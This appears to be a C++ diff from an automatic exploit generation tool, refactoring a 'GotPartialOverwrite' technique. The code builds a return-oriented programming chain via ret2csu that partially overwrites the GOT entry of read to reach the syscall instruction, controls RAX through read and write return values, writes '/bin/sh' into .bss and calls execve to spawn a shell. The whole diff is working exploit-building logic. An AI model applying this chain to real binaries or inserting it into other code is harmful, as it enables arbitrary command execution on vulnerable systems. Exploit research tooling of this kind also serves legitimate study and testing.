@@ -55,51 +55,47 @@ std::vector<RopSubchain> GotPartialOverwrite::getRopSubchains() const {
     assert(ret2csu);
 
     // read(0, elf.got['read'], 1), setting RAX to 1.
-    RopSubchain read1 = ret2csu->getRopSubchains(
+    RopSubchain part1 = ret2csu->getRopSubchains(
         BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create<BaseType::GOT>(elf, "read"),
         ConstantExpr::create(1, Expr::Int64))[0];
 
     // write(1, 0, 0), setting RAX to 0.
-    RopSubchain read2 = ret2csu->getRopSubchains(
+    RopSubchain part2 = ret2csu->getRopSubchains(
         BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(1, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
 
     // Read "/bin/sh" into elf.bss(), setting RAX to 59.
-    RopSubchain read3 = ret2csu->getRopSubchains(
+    RopSubchain part3 = ret2csu->getRopSubchains(
         BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create<BaseType::BSS>(elf),
         ConstantExpr::create(59, Expr::Int64))[0];
 
     // Return to sys_execve.
-    RopSubchain read4 = ret2csu->getRopSubchains(
+    RopSubchain part4 = ret2csu->getRopSubchains(
         BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         BaseOffsetExpr::create<BaseType::BSS>(elf),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
 
-    RopSubchain part1;
-    RopSubchain part2;
-    RopSubchain part3;
+    RopSubchain ret1;
+    RopSubchain ret2;
+    RopSubchain ret3;
 
-    part1.reserve(1 + read1.size() + read2.size() + read3.size() + read4.size());
-    part1.push_back(ConstantExpr::create(0, Expr::Int64));
-    part1.insert(part1.end(), read1.begin(), read1.end());
-    part1.insert(part1.end(), read2.begin(), read2.end());
-    part1.insert(part1.end(), read3.begin(), read3.end());
-    part1.insert(part1.end(), read4.begin(), read4.end());
-    part2 = { ByteVectorExpr::create(std::vector<uint8_t> { getLsbOfReadSyscall() }) };
-    part3 = { ByteVectorExpr::create(ljust("/bin/sh", 59, 0x00)) };
+    ret1.reserve(1 + part1.size() + part2.size() + part3.size() + part4.size());
+    ret1.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
+    ret1.insert(ret1.end(), part1.begin(), part1.end());
+    ret1.insert(ret1.end(), part2.begin(), part2.end());
+    ret1.insert(ret1.end(), part3.begin(), part3.end());
+    ret1.insert(ret1.end(), part4.begin(), part4.end());
+    ret2 = { ByteVectorExpr::create(std::vector<uint8_t> { getLsbOfReadSyscall() }) };
+    ret3 = { ByteVectorExpr::create(ljust("/bin/sh", 59, 0x00)) };
 
-    return { part1, part2, part3 };
-}
-
-RopSubchain GotPartialOverwrite::getExtraRopSubchain() const {
-    return {};
+    return { ret1, ret2, ret3 };
 }
 
 
